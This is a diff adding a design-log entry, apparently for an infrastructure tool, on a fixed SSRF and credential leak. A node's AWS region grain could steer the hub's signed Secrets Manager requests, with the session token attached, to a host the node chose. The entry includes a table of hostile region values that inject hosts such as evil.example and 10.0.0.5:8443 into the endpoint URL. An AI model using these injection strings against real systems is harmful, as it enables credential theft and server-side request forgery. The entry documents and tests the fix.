@@ -28044,6 +28044,169 @@ the cost should be small, but that is not measured.
 the old serial in memory only. The record keeps just the current
 serial, so a hub restart forgets every superseded one (M-05 in the
 review that found this). That has its own fix. It is not this one.
+### 5.324 A node's `region` grain chose the host the hub sent its AWS credentials to
+
+Audit finding H-20. `aws_secrets_manager` built its endpoint as
+`"https://secretsmanager." + region + "." + suffix`. The region came,
+in order, from the secret's own `region`, the ARN's fourth field, the
+node's `region` grain, and the block's `region`. The grain is the
+node's to set, so a node chose part of the host. The request it built is
+SigV4-signed and carries the access key ID in `Authorization` and the
+session token in `X-Amz-Security-Token`, and what came back went into
+that node's pillar. So one node could make the hub:
+
+- send a signed request to any host it named (SSRF from the hub);
+- give that host the key ID and a live session token;
+- put a value of its choosing in its own `aws_secrets` pillar.
+
+It is wider than the audit said. With `node_grain` on, the node also
+writes each secret entry, including its `region` and its ARN, and
+`node_grain_allow` checked only the secret ID. The partition in a
+node's ARN chose the suffix as well; an unknown one fell through to the
+commercial suffix.
+
+**Reproduced, through the handler, with nothing on a network.** A test
+transport records the host of each request and answers locally. With
+both halves of the fix removed, a node's `region` grain sent:
+
+| grain | host the signed request went to |
+|---|---|
+| `x@evil.example/` | `evil.example` |
+| `evil.example:8443/` | `secretsmanager.evil.example:8443` |
+| `10.0.0.5:8443/p?` | `secretsmanager.10.0.0.5:8443` |
+| `evil.example#` | `secretsmanager.evil.example` |
+| `us-east-1@evil.example` | `evil.example.amazonaws.com` |
+
+and, on the first, the `X-Amz-Security-Token` header carried the session
+token from the environment. The `region` field of a `node_grain` entry
+did the same.
+
+**The change has two halves, and each was shown to hold alone.**
+
+1. **Where a region becomes a host, it is checked, whoever supplied
+   it.** `awsauth.ServiceURL` refuses a region that does not match
+   `^[a-z]{2}(-[a-z]+)+-[0-9]{1,2}$` (at most 32 bytes), builds the URL
+   as a `url.URL`, renders it, parses it back, and refuses it unless
+   the host is exactly `service.region.suffix`. The grammar admits the
+   names of the three partitions the extension reaches (`us-east-1`,
+   `eu-central-2`, `ap-southeast-4`, `il-central-1`, `us-gov-west-1`,
+   `cn-north-1`, `cn-northwest-1`). It admits no `.`, `@`, `:`, `/`,
+   `?`, `#` or upper case, so a region cannot add a label, become
+   userinfo, add a port, or end the authority. It is a grammar, not a
+   list, so a new region does not need a release. `awsauth.PartitionSuffix`
+   answers `aws`, `aws-us-gov` and `aws-cn` and refuses anything else.
+   The client checks the region before it resolves credentials, so a
+   refused region causes no metadata or STS call either. With a
+   configured `endpoint` the region is not in the host, but it is in
+   the signing scope, so it is checked there too. STS's endpoint in
+   `awsauth` goes through `ServiceURL` as well; its region is the
+   operator's, so that half is hardening, not a fix.
+2. **A region a node supplies is used only if the block allows it.**
+   That is the `region` grain, and the `region` and ARN of a
+   `node_grain` entry. It is allowed if it is the block's own `region`
+   or is listed in the new `node_region_allow` (exact names). Anything
+   else fails that node's compilation with a message naming the
+   setting. A region the hub wrote (the block, `pillar_list`) is held
+   to the grammar only.
+
+An unlisted grain is **refused, not replaced** with the block's
+`region`. Falling back would read the secret of the same name from a
+different region, which in an estate with per-region secrets is a
+different value, and would do it without saying so. That is the
+failure this extension already refuses for a failed fetch.
+
+The block's `region`, `node_region_allow` and `partition` are checked
+when the block is read, so a typo is reported against the block. Errors
+quote at most 64 bytes of a value they refuse (`awsauth.Bounded`).
+
+**This is a change for an estate that spans regions.** A node whose
+`region` grain differs from the block's `region`, whose secrets are named
+rather than given as ARNs, used to read them from its own region. It
+now fails its pillar until that region is in `node_region_allow`. The
+extension's version is now 1.1.0, so a pin has to be moved on purpose.
+
+**The version, and why two extensions moved.** Both extensions say their
+`Version` "changes when behaviour does", because a pin names it. That
+was not true before this change. `aws_secrets_manager` changed
+behaviour twice at 1.0.0: its SPEC 24.3 resource limits (5177ea3) and
+the not-secret setting (09c200b, #274). This change bumps it to 1.1.0,
+because it adds a setting and refuses configurations it used to accept.
+`halite-ext-signer-kms` links `internal/awsauth`. It is 1.0.1 now,
+because the STS endpoint goes through `ServiceURL`: with an assumed
+role, a `region` that is not a region name now fails before the
+AssumeRole call, where before it became part of the host. A valid
+region reaches the same host as before (`TestTheSTSEndpointComesFromThePartition`).
+The URL gained a trailing `/`. A throwaway test, not kept, signed and
+sent both forms to a local server. The SigV4 `Authorization` header was
+identical, and both arrived as `POST /`, because `canonicalURI` already
+writes `/` for an empty path and `net/http` sends `/` for one. No real
+STS endpoint was contacted.
+`halite-ext-signer-local` links neither package and is unchanged. The
+examples in `docs/extensions.md`, handbook chapter 29 and
+`contrib/examples/hub.yaml` that name `aws_secrets_manager`'s version
+now say 1.1.0.
+
+Nothing compares the version an extension reports in its handshake
+with the `version` its bundle was signed as. The hub checks a pin
+against the manifest, and the manifest against its `_ext/<name>/<version>/`
+path. So the 1.1.0 binary signed with `--ext-version 1.0.0` still
+loads. The pin and `sys.list_extensions` both say 1.0.0, because
+`Describe` reports the manifest's version. The version the running
+binary states in its handshake is never read. Noted here, not fixed.
+
+**How it is tested.** `cmd/halite-ext-aws-secrets/region_test.go` drives
+the handler with no `endpoint` and a transport that fails the test if
+it is called:
+
+- eleven hostile regions as the `region` grain, and as a `node_grain`
+  entry's `region`; three as the region field of a node-named ARN; an
+  unknown partition in a node-named ARN. All refused, nothing sent.
+- a well-formed but unlisted region from the grain and from a node
+  entry: refused, naming `node_region_allow`. Listed, or equal to the
+  block's `region`: sent to exactly `secretsmanager.<region>.amazonaws.com`.
+- eight valid regions across the three partitions: the request went to
+  exactly the expected host, `.amazonaws.com.cn` for `aws-cn`.
+- the client alone refuses every hostile region, and errors are bounded.
+
+`internal/awsauth/region_test.go` holds the grammar, the bound, the
+URL's host, the partitions and STS.
+
+Broken on purpose, each failed and was restored:
+
+- `endpoint` concatenating again (policy still on): every hostile case
+  in the client test sent a signed request, to the hosts in the table.
+  The handler tests passed, because the policy half refused first.
+- the policy half returning the region unchecked (client still on): the
+  two unlisted-region tests failed. The hostile tests mostly passed,
+  because the client refused them; the 5,014-byte one failed, because
+  the handler's error then echoed the whole value.
+- the grammar accepting everything (`ServiceURL`'s parse-back still on):
+  `us-east-1.evil.example`, `US-EAST-1` and an over-long region reached
+  a request; the parse-back alone caught `@`, `:`, `/` and `#`.
+- both halves off: the table above.
+
+**Not verified.**
+
+- **No AWS.** Nothing here contacted AWS. That a real Secrets Manager
+  answers on the URL now built (with a trailing `/`, as before) was not
+  run. The bytes on the wire were compared only against the previous
+  code. The STS URL gained a trailing `/`; the request line and the
+  SigV4 canonical URI are `/` either way, which was read from
+  `canonicalURI` and not run against STS.
+- **No GovCloud or China endpoints.** The `aws-us-gov` and `aws-cn`
+  hosts are asserted against a test transport only.
+- **The grammar against AWS's own list.** The regions named above were
+  typed in, not taken from AWS's endpoint data. A region that does not
+  fit the grammar would be refused, and none is known.
+- **The other region-to-host builders.** `internal/s3fs` and
+  `internal/awskms` build hosts from a region too. Their regions come
+  from the hub's configuration, not a node, and they were not changed or
+  checked here.
+- **Other unbounded echoes of node bytes.** `node_grain_allow`'s refusal
+  still quotes a node's secret ID in full, as before.
+- **macOS only.** The tests ran on Darwin 25.6, not on FreeBSD or Linux.
+
+
 
 
 
